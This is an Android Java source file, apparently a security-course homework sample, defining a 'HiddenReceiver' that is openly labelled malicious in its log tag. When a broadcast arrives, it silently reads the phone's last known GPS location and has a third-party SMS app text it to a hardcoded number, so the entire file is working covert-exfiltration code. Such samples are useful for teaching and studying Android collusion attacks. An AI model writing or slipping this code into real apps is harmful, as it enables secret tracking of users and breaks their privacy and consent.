package uci.inf221.fa16.hw2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.util.Log;

public class HiddenReceiver {
	public BroadcastReceiver getBroadcastReceiver(){
    	BroadcastReceiver receiver = new BroadcastReceiver() {
			
			@Override
			public void onReceive(Context context, Intent intent) {
				// Get current location and send it to sms messaging app
				LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
				Location loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);

				if (loc != null) {
					Intent unauthorizedBehavior = new Intent("de.ub0r.android.smsdroid.SENDSMS");
					unauthorizedBehavior.setPackage("de.ub0r.android.smsdroid");
					unauthorizedBehavior.putExtra("number", "4445556666");
					String locationData = "lat: " + loc.getLatitude() + " lon: " + loc.getLongitude();
					unauthorizedBehavior.putExtra("location", locationData);

					Log.d("[MALICIOUS][Hidden Receiver]", "Send unintended data " + locationData);
					
					context.startService(unauthorizedBehavior);
				}
			}
		};
    	
    	return receiver;
    }
}
